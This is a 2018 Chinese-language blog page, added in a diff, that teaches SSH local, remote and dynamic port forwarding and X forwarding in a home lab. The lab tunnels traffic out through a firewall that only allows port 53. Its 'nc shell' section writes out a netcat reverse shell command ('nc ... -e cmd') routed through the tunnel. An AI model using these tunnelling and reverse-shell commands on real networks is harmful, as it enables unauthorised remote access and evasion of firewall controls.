@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="SSH 本地端口转发将一本地端口与远程服务器建立隧道简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。2003 IP：10.10.10.130Kali IP：10.10.10.144 首先配置一下Kali环境。修改ssh的配置文件1234/etc/ssh/sshd_configPermitRootLogin ye">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSH简单应用">
+<meta property="og:url" content="http://yoursite.com/2018/05/14/SSH简单应用/index.html">
+<meta property="og:site_name" content="Chace Blog">
+<meta property="og:description" content="SSH 本地端口转发将一本地端口与远程服务器建立隧道简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。2003 IP：10.10.10.130Kali IP：10.10.10.144 首先配置一下Kali环境。修改ssh的配置文件1234/etc/ssh/sshd_configPermitRootLogin ye">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-05-14T05:23:06.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSH简单应用">
+<meta name="twitter:description" content="SSH 本地端口转发将一本地端口与远程服务器建立隧道简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。2003 IP：10.10.10.130Kali IP：10.10.10.144 首先配置一下Kali环境。修改ssh的配置文件1234/etc/ssh/sshd_configPermitRootLogin ye">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SSH简单应用</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/05/20/3道CTF题的尝试/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/05/12/一次简单的流量重定向/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Post Anterior</span>
+      <span id="i-next" class="info" style="display:none;">Post Següent</span>
+      <span id="i-top" class="info" style="display:none;">Adalt</span>
+      <span id="i-share" class="info" style="display:none;">Compartir Post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/05/14/SSH简单应用/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/05/14/SSH简单应用/&text=SSH简单应用"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/05/14/SSH简单应用/&is_video=false&description=SSH简单应用"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSH简单应用&body=Check out this article: http://yoursite.com/2018/05/14/SSH简单应用/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/05/14/SSH简单应用/&name=SSH简单应用&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-本地端口转发"><span class="toc-number">1.</span> <span class="toc-text">SSH 本地端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#首先配置一下Kali环境。"><span class="toc-number">1.0.1.</span> <span class="toc-text">首先配置一下Kali环境。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内网Linux配置"><span class="toc-number">1.0.2.</span> <span class="toc-text">内网Linux配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nc-shell"><span class="toc-number">1.0.3.</span> <span class="toc-text">nc shell</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-远程端口转发"><span class="toc-number">2.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-动态端口转发"><span class="toc-number">3.</span> <span class="toc-text">SSH 动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X-协议转发"><span class="toc-number">4.</span> <span class="toc-text">X 协议转发</span></a></li>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SSH简单应用
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Chace Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-05-14T05:21:43.000Z" itemprop="datePublished">2018-05-14</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH 本地端口转发"></a>SSH 本地端口转发</h3><p>将一本地端口与远程服务器建立隧道<br>简单介绍一下这次的配置情况，一样是有一个只能出站53端口的防火墙，内网一台Linux机器作为ssh客户端，外网有一台kali开启ssh。<br>2003 IP：10.10.10.130<br>Kali IP：10.10.10.144</p>
+<h5 id="首先配置一下Kali环境。"><a href="#首先配置一下Kali环境。" class="headerlink" title="首先配置一下Kali环境。"></a>首先配置一下Kali环境。</h5><p>修改ssh的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config</span><br><span class="line">PermitRootLogin yes</span><br><span class="line">Port 53</span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure></p>
+<p><code>service ssh start</code><br><code>netstat -pantu | grep :53</code><br><code>service ssh restart</code></p>
+<h5 id="内网Linux配置"><a href="#内网Linux配置" class="headerlink" title="内网Linux配置"></a>内网Linux配置</h5><p>SSH本地端口转发<br><code>ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt;user@&lt;ssh server&gt;-p&lt;ssh server port&gt;</code><br><code>ssh -L 7001:10.10.10.130:80 root@10.10.10.144 -p 53</code><br><code>http://127.0.0.1:7001</code>就可以看到2003机器80端口的网页</p>
+<p>如果不是2003开启网页服务而是Kali本身开启网页服务，尝试一下。<br><code>service apache2 start</code><br>建立一条新的隧道<br><code>ssh -fCNg -L &lt;listen port&gt;:localhost:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh port&gt;</code><br><code>ssh -CfN -L 7002:localhost:80 root@10.10.10.144 -p 53</code><br><code>http://127.0.0.1:7002</code> 就可以看到kali的web server</p>
+<p>那么再试一下远程桌面<br><code>ssh -CfN -L 7003:10.10.10.130:3389 root@10.10.10.144 -p 53</code><br><code>rdesktop 127.0.0.1:7003</code></p>
+<p>-f 后台运行进程<br>-N 不执行登陆SHELL<br>-g 复用访问时作为网关，支持多主机访问本地侦听端口<br>网关模式转发RDP，NC shell<br><code>ssh -CfNg -L 7004:10.10.10.130:3389 root@10.10.10.144 -p 53</code><br>这样之后再在内网开一台XP虚拟机。<br>可以通过mstsc，连接1.1.1.3:7004，连接到2003的远程桌面。</p>
+<h5 id="nc-shell"><a href="#nc-shell" class="headerlink" title="nc shell"></a>nc shell</h5><p>在这个场景下，把Kali和Linux只充当一个ssh隧道。<br>然后XP和2003之间nc流量通过这个SSH隧道。<br>2003：<code>nc -nvlp 3333</code><br>XP : <code>nc 1.1.1.3:7005 -e cmd</code><br>Linux : <code>ssh -CfNg -L 7005:10.10.10.130:3333 root@10.10.10.144 -p 53</code></p>
+<p>端口转发基于建立起来的SSH隧道，隧道中断则端口转发中断<br>只能在建立隧道时创建转发，不能为已有隧道增加端口转发</p>
+<h3 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH 远程端口转发"></a>SSH 远程端口转发</h3><ul>
+<li>由于ACL等原因，SSH与应用连接建立方向相反</li>
+<li>本地端口转发<ul>
+<li>SSH客户端 + 应用客户端位于FW一段</li>
+<li>SSH服务端 + 应用服务端位于另一端</li>
+</ul>
+</li>
+<li>远程端口转发<ul>
+<li>SSH客户端，应用客户端位于FW两端</li>
+<li>SSH服务端，应用服务端位于FW两端<br>`ssh -fNg -R <listen port="">:<remote ip="">:<remote port=""> user@<ssh server=""> -p <ssh server="" port=""></ssh></ssh></remote></remote></listen></li>
+</ul>
+</li>
+<li>之所以称为远程，是因为SSH侦听端口开在远程的SSH server上</li>
+<li>侦听端口永远开在应用客户端一方<br><code>ssh -CfNg -R 7001:1.1.1.2:80 root@10.10.10.144 -p 53</code><br><code>ssh -CfNg -R 7001:1.1.1.2:3389 root@10.10.10.144 -p 53</code><br>在kali上 <a href="http://127.0.0.1:7001" target="_blank" rel="noopener">http://127.0.0.1:7001</a> 可以看到XPweb</li>
+</ul>
+<h3 id="SSH-动态端口转发"><a href="#SSH-动态端口转发" class="headerlink" title="SSH 动态端口转发"></a>SSH 动态端口转发</h3><ul>
+<li>本地，远程端口转发都需要固定应用服务器IP，Port<ul>
+<li>应用端口繁多，逐个转发效率低</li>
+<li>某些应用不固定端口</li>
+<li>某些网站不支持IP直接访问</li>
+<li>使用非受信网络上网时保护流量不被嗅探</li>
+</ul>
+</li>
+<li>本地侦听Socks4/5代理端口<ul>
+<li>由SSH server决定如何转发</li>
+<li>作为翻墙代理使用</li>
+<li>配置客户端代理（浏览器）</li>
+<li>使用proxychains支持无代理客户端</li>
+<li><code>ssh -CfNg -D 7001 root@1.1.1.1 -p 53</code><h3 id="X-协议转发"><a href="#X-协议转发" class="headerlink" title="X 协议转发"></a>X 协议转发</h3></li>
+</ul>
+</li>
+<li>远程登陆Linux GUI运行图形化界面工具<ul>
+<li>VNC</li>
+<li>X Windows</li>
+</ul>
+</li>
+<li>防火墙限制访问时<ul>
+<li>基于SSH的X转发</li>
+<li>ssh -X <a href="mailto:user@1.1.1.1" target="_blank" rel="noopener">user@1.1.1.1</a> -p 53</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-本地端口转发"><span class="toc-number">1.</span> <span class="toc-text">SSH 本地端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#首先配置一下Kali环境。"><span class="toc-number">1.0.1.</span> <span class="toc-text">首先配置一下Kali环境。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#内网Linux配置"><span class="toc-number">1.0.2.</span> <span class="toc-text">内网Linux配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#nc-shell"><span class="toc-number">1.0.3.</span> <span class="toc-text">nc shell</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-远程端口转发"><span class="toc-number">2.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-动态端口转发"><span class="toc-number">3.</span> <span class="toc-text">SSH 动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#X-协议转发"><span class="toc-number">4.</span> <span class="toc-text">X 协议转发</span></a></li>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/05/14/SSH简单应用/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/05/14/SSH简单应用/&text=SSH简单应用"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/05/14/SSH简单应用/&is_video=false&description=SSH简单应用"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SSH简单应用&body=Check out this article: http://yoursite.com/2018/05/14/SSH简单应用/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/05/14/SSH简单应用/&title=SSH简单应用"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/05/14/SSH简单应用/&name=SSH简单应用&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menú</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Compartir</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Cap amunt</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 jsmhny
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Inici</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/Search/">Buscar</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
